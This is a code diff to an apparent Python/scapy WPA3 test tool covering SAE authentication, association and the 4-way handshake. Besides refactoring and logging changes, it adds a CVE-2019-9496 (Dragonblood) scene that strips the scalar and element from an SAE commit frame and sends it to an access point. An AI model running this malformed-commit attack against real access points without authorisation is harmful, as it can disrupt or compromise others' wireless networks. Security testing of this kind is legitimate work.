@@ -30,6 +30,7 @@ from scapy.fields import ShortEnumField,StrFixedLenField
 from scapy.packet import Packet,Raw
 from scapy.utils import randstring
 from scapy.sendrecv import AsyncSniffer
+from scapy.config import conf as scapyconf
 
 from .libwifi import log,DEBUG
 from .utils_wpa3_crypt import Calc_MIC, CCMPCrypto
@@ -37,14 +38,15 @@ from .utils_wifi_inject import Dot11EltRates
 from socket_hook_py import sendp, sniff 
 
 # ----------------------- Utility ---------------------------------
-# # FORMAT = '%(asctime)s::%(filename)s:%(lineno)d:%(funcName)s ---- %(message)s'
 # FORMAT = "%(asctime)s.%(msecs)d %(levelname)-8s [%(processName)s] [%(threadName)s] %(filename)s:%(lineno)d --- %(message)s"
-FORMAT = "%(asctime)s::  [%(filename)s:%(lineno)d] --- %(message)s"
+FORMAT = "[%(pathname)s:%(lineno)d] --- %(message)s"
 logging.basicConfig(level = logging.DEBUG, format=FORMAT)
 
-scene_auth = 0
-scene_asso = 1
-scene_4_way_handshake = 2
+class SCENE:
+    auth = 0
+    asso = 1
+    four_way_handshake = 2
+    cve_2019_9496 = 3
 
 class SAE(Packet):
     name = "SAE"
@@ -279,12 +281,13 @@ class SAEHandshake():
 
         return self.kck, self.pmk
 
-    def send_confirm(self, iface):
+    def send_confirm(self):
         send_confirm = 0
         confirm = calculate_confirm_hash(self.kck, send_confirm, self.scalar, self.element, self.peer_scalar, self.peer_element)
 
-        auth = build_sae_confirm(self.srcaddr, self.dstaddr, send_confirm, confirm)
-        self_send(RadioTap()/auth, iface=iface)
+        dot11_confirm = build_sae_confirm(self.srcaddr, self.dstaddr, send_confirm, confirm)
+        
+        return dot11_confirm
 
     def process_confirm(self, p):
         payload = str(p[Dot11Auth].payload)
@@ -392,7 +395,7 @@ class eapol_handshake():
 
     def run(self):
         # Key (Message 1 of 4)
-        logging.info("\n-------------------------Key (Message 1 of 4): ")
+        logging.info("-------------------------Key (Message 1 of 4): ")
         eapol_p1 = sniff(iface=self.config.iface,
                          lfilter=lambda r: (r.haslayer(EAPOL) and (r.getlayer(WPA_key).key_info  == 0x0088)) ,
                          count=1, store=1, timeout=2, prn = lambda x: logging.debug(x))
@@ -443,7 +446,7 @@ class eapol_handshake():
         self_send(eapol_2_packet, iface = self.config.iface)
 
         # Key (Message 3 of 4)
-        logging.debug("\n-------------------------Key (Message 3 of 4): ")
+        logging.debug("-------------------------Key (Message 3 of 4): ")
 
         result = sniff(iface=self.config.iface,
                          lfilter=lambda r: (r.haslayer(EAPOL) and (r.getlayer(WPA_key).key_info  == 0x13c8 )) ,
@@ -472,7 +475,7 @@ class eapol_handshake():
 
 
         # Key (Message 4 of 4)
-        logging.info(f"\n-------------------------\nKey (Message 4 of 4): ")
+        logging.info(f"-------------------------\nKey (Message 4 of 4): ")
         eapol_4 = EAPOL(version=1,
                         type=3,
                         len =95) / WPA_key(descriptor_type=2,
@@ -527,6 +530,8 @@ def test(
     # logging.debug(config.__dict__)
     
     # # SAE
+    # 链路认证
+    logging.info("-------------------------SAE Authentication : ")
     sae = SAEHandshake(password=psk,srcaddr=sta_mac,dstaddr=ap_mac)
 
     sae_commit_1 = sae.send_commit()
@@ -541,29 +546,53 @@ def test(
                     )
     t1.start()
     time.sleep(0.1)
+    if scene == SCENE.cve_2019_9496:
+        ## dragonblood 漏洞
+        logging.info("-------------------------CVE-2019-9496 : ")
+        sae_tmp = SAE(sae_commit_1[Dot11Auth].payload.build())
+        del sae_tmp[SAE].scalar
+        del sae_tmp[SAE].ffe
+        sae_commit_1[Dot11Auth].payload = sae_tmp
+        scapyconf.iface = iface
+        
     self_send(RadioTap() / sae_commit_1 ,iface=iface)
     time.sleep(0.2)
     
     try:
-        sae_commit_2 = t1.stop()[0]
+        if scene == SCENE.cve_2019_9496:
+            ## dragonblood 漏洞
+            sae_commit_2 = sae_commit_1
+        else:
+            sae_commit_2 = t1.stop()[0]
     except IndexError:
         logging.error('Not Found SAE Auth commit response , is AP alive ?')
         sys.exit(1)
+    
+    # logging.debug(sae_commit_2)
     
     if sae_commit_2[Dot11Auth].status != 0x0000:
         logging.error(f'AP refuse our SAE Commit Request.')
         sys.exit(1)
         
     dot11_sae = SAE(sae_commit_2[Dot11Auth].payload.original)
-    # dot11_sae.show()
+    
     kck, pmk = sae.process_commit(dot11_sae)
     logging.debug(f"KCK {kck.hex()}")
     logging.debug(f"PMK {pmk.hex()}")
-    sae.send_confirm(iface=iface)
-    if scene == scene_auth:
-        logging.info(f'Success scene {scene_auth} : scene_auth.')
+    
+    dot11_confirm = sae.send_confirm()
+    self_send(RadioTap()/dot11_confirm, iface=iface)
+    
+    if scene == SCENE.cve_2019_9496:
+        logging.info(f'Success scene {scene} : CVE-2019-9496.')
+        sys.exit()
+    
+    if scene == SCENE.auth:
+        logging.info(f'Success scene {scene} : SAE Authentication.')
         sys.exit(0)
-
+        
+    # 链路关联
+    logging.info("-------------------------Link Assocation : ")
     # # Association
     rsn = RSN()
     rsn_info = rsn.get_rsn_info()
@@ -601,8 +630,8 @@ def test(
         logging.error('Not Found Association Response .')
         sys.exit(1)
 
-    if scene == scene_asso:
-        logging.info(f'Success scene {scene_asso} : scene_asso.')
+    if scene == SCENE.asso:
+        logging.info(f'Success scene {scene} : Association.')
         sys.exit(0)
         
         
@@ -626,7 +655,7 @@ def test(
     
     # 断开认证
     # # WPA3 的 deauth 经过了加密，也就是必须完成完整协商才能 deauth
-    logging.info(f"\n-------------------------\n从AP离开: ")
+    logging.info(f"-------------------------\n从AP离开: ")
     TK : bytes = PTK[-16:]
     Plain_text = bytes(Dot11Deauth(reason=3))
     # logging.debug(f'TK & Plain_text : {TK.hex(), Plain_text.hex()}')
@@ -654,8 +683,8 @@ def test(
                     Raw(MIC)
                     )
     self_send(wpa3_deauth, iface = config.iface)
-    if scene == scene_4_way_handshake:
-        logging.info(f'Success scene {scene_4_way_handshake} : scene_4_way_handshake.')
+    if scene == SCENE.four_way_handshake:
+        logging.info(f'Success scene {scene} : 4_way_handshake.')
         sys.exit(0)
 
     return
